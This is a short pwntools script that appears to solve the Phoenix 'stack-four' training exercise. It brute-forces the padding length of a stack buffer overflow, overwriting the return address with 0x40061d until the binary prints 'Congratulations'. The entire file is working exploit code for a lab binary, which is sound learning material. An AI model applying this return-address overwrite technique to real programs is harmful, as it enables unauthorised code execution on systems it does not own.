from pwn import *

e = ELF('/opt/phoenix/amd64/stack-four')
print(e.functions)

for f in e.functions.values():
    print("function: " + str(f))
    print("%#x -> function" % f.address)


payload = b""
for i in range(32):
    payload = b"B"*(64+i)+pack(0x40061d, 64)
    write("/tmp/docgil",payload)
    print(read("/tmp/docgil"))
    io = process("cat /tmp/docgil  | /opt/phoenix/amd64/stack-four", shell=True)
    r = io.recvall()
    # io.wait_for_close()
    print(r)
    if "Congratulations" in r.decode("utf-8"):
        print("found payload: " + str(payload) + " index: " + str(i))
        break

# +24 B's
